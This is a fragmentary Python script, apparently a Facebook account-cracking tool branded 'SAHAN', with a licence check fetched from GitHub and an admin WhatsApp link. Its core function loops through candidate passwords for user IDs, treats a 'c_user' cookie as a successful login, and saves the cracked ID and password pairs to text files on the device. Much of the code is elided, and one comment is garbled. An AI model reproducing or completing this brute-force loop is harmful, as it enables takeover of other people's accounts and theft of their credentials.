...
def menu_apikey():
  ...
  server = requests.get('https://github.com/𝙎𝘼𝙃𝘼𝙉free/apv/blob/main/b.txt').text
...
\033[38;5;46m║\033[93;1m[\033[92;1m•\033[93;1m] \033[97;1m𝐀𝐮𝐭𝐡𝐨𝐫   \033[38;5;196m: \33[97;1m𝙎𝘼𝙃𝘼𝙉                \033[38;5;46m   ║
...
\033[1;33m╚════════════════════════════════════════════════╝""")                                         
  ...
  try:
    ...
    httpCaht = requests.get("https://github.com/𝙎𝘼𝙃𝘼𝙉free/apv/blob/main/b.txt").text
...
def admin():
	...
	if bal =='1':
		...
		os.system('xdg-open https://wa.me/+880401648565');time.sleep(1)
...
def a(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m𝙎𝘼𝙃𝘼𝙉\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r\33[1;92m [𝙎𝘼𝙃𝘼𝙉-𝐎𝐊] '+cid+' | '+ps+'\33[0;92m')
                ...
                open('/sdcard/𝙎𝘼𝙃𝘼𝙉-𝐎𝐊.𝐭𝐱𝐭', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                ...
                open('/sdcard/𝙎𝘼𝙃𝘼𝙉-CP.txt', 'a').write( uid+' | '+ps+' \n')
        ...
        sys.stdout.write(f'\r\033[m[𝙎𝘼𝙃𝘼𝙉] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),

       # sys.stdout.write(f" \r{R} [{B}𝙎𝘼𝙃𝘼𝙉{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/𝙎𝘼𝙃𝘼𝙉-𝐎𝐊.𝐭𝐱𝐭', 'a').write(cid+' | '+ps+'\n')
